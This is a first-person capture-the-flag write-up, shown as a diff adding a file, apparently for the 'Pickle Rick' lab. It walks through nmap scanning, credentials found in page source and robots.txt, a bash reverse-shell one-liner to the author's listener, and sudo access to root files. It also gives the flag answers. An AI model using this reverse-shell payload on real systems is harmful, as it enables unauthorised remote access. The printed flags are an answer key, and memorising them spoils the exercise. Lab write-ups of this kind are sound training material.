@@ -1,0 +1,83 @@
+The Pickle Rick CTF was my first ever completed CTF
+
+It goes over hacking into a vulnerable website to find three secret ingredients/flags. 
+
+So the first thing that I did was run an nmap scan on the target IP, while simultaneously opening the webpage.
+
+nmap -sV -sC 10.10.102.29
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 25:a4:7d:b8:6b:82:96:0e:13:b6:15:d7:ed:f9:48:02 (RSA)
+|   256 f2:33:7e:54:f9:f3:21:17:9f:d1:d0:42:5b:fd:38:9e (ECDSA)
+|_  256 d9:2a:02:0e:9f:2f:29:42:b1:36:bf:ce:d7:17:da:43 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Rick is sup4r cool
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+On the webpage I pressed F12 to open the developer console and noticed a comment that told me a username was: 
+
+<!--Note to self, remember username! Username: R1ckRul3s-->
+
+It's always good with a website to check the robots.txt file so I typed in:
+10.10.102.29/robots.txt
+
+This gave me a possible password: Wubbalubbadubdub
+
+
+There was no input for a login on the website so I used DirBuster to enumerate possible subdirectories
+I found a login.php page doing this
+
+So I went to 10.10.102.29/login.php and entered the credentials given.
+
+I was presented with a command line interface and could do things such as ls.
+
+This showed me the first ingredient:
+Sup3rS3cretPickl3Ingred.txt
+assets
+clue.txt
+denied.php
+index.html
+login.php
+portal.php
+robots.txt
+
+The website blocked cat so I instantly thought about starting a reverse shell so I listened and entered this reverse shell payload:
+
+bash -c 'bash -i >& /dev/tcp/10.6.4.208/5555 0>&1'
+
+I used netcat to listen for the reverse shell and got the first ingredient.
+
+└─$ nc -lvp 5555
+listening on [any] 5555 ...
+10.10.102.29: inverse host lookup failed: Unknown host
+connect to [10.6.4.208] from (UNKNOWN) [10.10.102.29] 40678
+bash: cannot set terminal process group (951): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ip-10-10-102-29:/var/www/html$ cat Sup3rS3cretPickl3Ingred.txt
+cat Sup3rS3cretPickl3Ingred.txt
+mr. meeseek hair
+
+Upon looking in clue.txt it said:
+cat clue.txt
+Look around the file system for the other ingredient.
+
+So I started navigating the file system and found the second ingredient in:
+www-data@ip-10-10-102-29:/home/rick$ ls
+ls
+second ingredients
+www-data@ip-10-10-102-29:/home/rick$ cat "second ingredients"
+cat "second ingredients"
+1 jerry tear
+
+I couldn't find anymore ingredients laying around so I attempted to escalate privellages.
+Eventually finding this:
+www-data@ip-10-10-102-29:/home$ sudo ls /root
+sudo ls /root
+3rd.txt
+snap
+www-data@ip-10-10-102-29:/home$ sudo cat /root/3rd.txt
+sudo cat /root/3rd.txt
+3rd ingredients: fleeb juice
